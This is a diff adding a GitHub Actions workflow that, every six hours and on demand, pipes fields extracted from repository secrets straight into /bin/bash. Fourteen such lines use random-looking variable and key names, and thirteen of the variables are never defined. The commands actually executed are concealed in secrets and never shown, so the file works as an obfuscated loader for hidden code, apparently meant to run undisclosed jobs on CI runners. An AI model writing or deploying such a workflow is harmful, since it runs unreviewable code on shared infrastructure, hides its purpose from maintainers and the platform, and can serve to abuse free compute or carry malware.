@@ -1,0 +1,30 @@
+name: guyishiwang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: guyishiwang
+        env:
+          jtwyg6194: ${{ secrets.jtwyg6194 }}
+        run: |
+          echo $jtwyg6194 | jq -r .zqipo89 | /bin/bash
+          echo $o555 | jq -r .lkbd66984 | /bin/bash
+          echo $ly884 | jq -r .ltl98355 | /bin/bash
+          echo $sso9 | jq -r .qdm6052 | /bin/bash
+          echo $ah711 | jq -r .hamnu2206 | /bin/bash
+          echo $neu1643 | jq -r .h97883 | /bin/bash
+          echo $osl6 | jq -r .sqj152 | /bin/bash
+          echo $tdnw48 | jq -r .d662 | /bin/bash
+          echo $oxcfe048 | jq -r .hjrnj7368 | /bin/bash
+          echo $hp174 | jq -r .vny19 | /bin/bash
+          echo $di9 | jq -r .whu01 | /bin/bash
+          echo $u531 | jq -r .hhav4 | /bin/bash
+          echo $ue434 | jq -r .bqn1605 | /bin/bash
+          echo $hkrna8144 | jq -r .a92 | /bin/bash
+
